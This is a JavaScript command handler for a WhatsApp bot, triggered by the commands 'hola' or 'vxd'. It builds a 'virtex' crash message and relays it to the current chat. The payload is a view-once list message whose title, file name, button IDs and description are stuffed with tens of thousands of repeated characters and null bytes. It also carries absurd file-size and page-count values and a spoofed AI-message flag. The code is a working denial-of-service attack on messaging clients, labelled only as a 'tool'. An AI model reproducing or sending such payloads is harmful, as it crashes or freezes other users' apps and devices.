import fs from 'fs';

const handler = async (m, { conn, usedPrefix, command }) => {
  try {
    let target = m.chat;
    let virtex = '💎⃢ ⏤͟͟͞͞𝑫𝒂𝒑𝒛𝒚 𝐕𝟏⿻ ' + 'ꦽ'.repeat(16999);

    let messagePayload = {
      viewOnceMessage: {
        message: {
          listResponseMessage: {
            title: virtex,
            listType: 2,
            singleSelectReply: {
              selectedRowId: '🎭',
            },
            contextInfo: {
              virtexId: conn.generateMessageTag(),
              participant: m.sender,
              mentionedJid: [m.sender],
              quotedMessage: {
                buttonsMessage: {
                  documentMessage: {
                    url: 'https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true',
                    mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                    fileSha256: 'QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=',
                    fileLength: '9999999999999',
                    pageCount: 1316134911,
                    mediaKey: '45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=',
                    fileName: '⏤͟͟͞͞𝑫𝒂𝒑𝒛𝒚 𝐕𝟏⿻' + '\u0000'.repeat(97770),
                    fileEncSha256: 'LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=',
                    directPath: '/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0',
                    mediaKeyTimestamp: '1726867151',
                    contactVcard: true,
                  },
                  hasMediaAttachment: true,
                  contentText: 'Hallo"',
                  footerText: '💎⃢ ᴍ͜͡ᴀ͜͡ʏ͜͡ᴢ͜͡ ɪ͜͡s⃟͜͡ ʜ͜͡ᴇ͜͡ʀ͜͡ᴇ͜͡ ⃢↯🔥',
                  buttons: [
                    {
                      buttonId: '\u0000'.repeat(170000),
                      buttonText: {
                        displayText: '⏤͟͟͞͞𝑫𝒂𝒑𝒛𝒚 𝐕𝟏⿻' + '\u0000'.repeat(1999),
                      },
                      type: 1,
                    },
                    {
                      buttonId: '\u0000'.repeat(220000),
                      buttonText: {
                        displayText: '⏤͟͟͞͞𝑫𝒂𝒑𝒛𝒚 𝐕𝟏⿻' + '\u0000'.repeat(1999),
                      },
                      type: 1,
                    },
                    {
                      buttonId: '\u0000'.repeat(220000),
                      buttonText: {
                        displayText: '𝑫𝒂𝒑𝒛𝒚' + '\u0000'.repeat(1999),
                      },
                      type: 1,
                    },
                  ],
                  viewOnce: true,
                  headerType: 3,
                },
              },
              description: '@' + m.sender.split('@')[0].repeat(2999),
            },
            messageContextInfo: {
              supportPayload: JSON.stringify({
                version: 2,
                is_ai_message: true,
                should_show_system_message: true,
              }),
            },
          },
        },
      },
    };

    await conn.relayMessage(target, messagePayload, { messageId: conn.generateMessageTag() });

    await m.react('💣');
  } catch (error) {
    m.reply(`Error: ${error.message}`);
    await m.react('❌');
  }
};

handler.help = ['hola'];
handler.tag = ['tools'];
handler.command = ['hola', 'vxd']; // puedes cambiar estos comandos si quieres

export default handler;